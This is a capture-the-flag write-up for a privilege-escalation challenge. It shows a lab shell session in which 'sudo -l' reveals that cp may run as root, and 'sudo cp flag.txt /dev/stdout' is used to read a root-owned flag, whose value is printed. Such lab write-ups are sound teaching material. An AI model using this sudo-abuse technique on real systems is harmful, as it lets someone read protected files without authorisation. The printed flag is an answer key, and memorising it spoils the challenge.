# Privilege
## writeup

the challenge is about privilege escalation

after you run ls and trying to read the flag you will find that the flag is owned by the root user

```
ctf@bba36b62073e:~$ ls
flag.txt
ctf@bba36b62073e:~$ ls cat flag.txt
ls: cannot access 'cat': No such file or directory
flag.txt
ctf@bba36b62073e:~$ cat flag.txt
cat: flag.txt: Permission denied
ctf@bba36b62073e:~$ ls -l
total 4
-r--r----- 1 root root 42 Dec 27 13:06 flag.txt

```
so we need to escalate our privileges to read the flag 
there is this useful command **sudo -l**

```
-l, --list                    list user's privileges or check a specific command
```

we got this

```
User ctf may run the following commands on bba36b62073e:
    (root : root) /usr/bin/cp
```

so we can run cp command as root user using sudo 

```
ctf@bba36b62073e:~$ sudo /usr/bin/cp flag.txt /dev/stdout
[sudo] password for ctf: 
Alphabit{PR1V1L3G3_3$CALAT10N_U$1NG_$UD0}
```

we got the flag 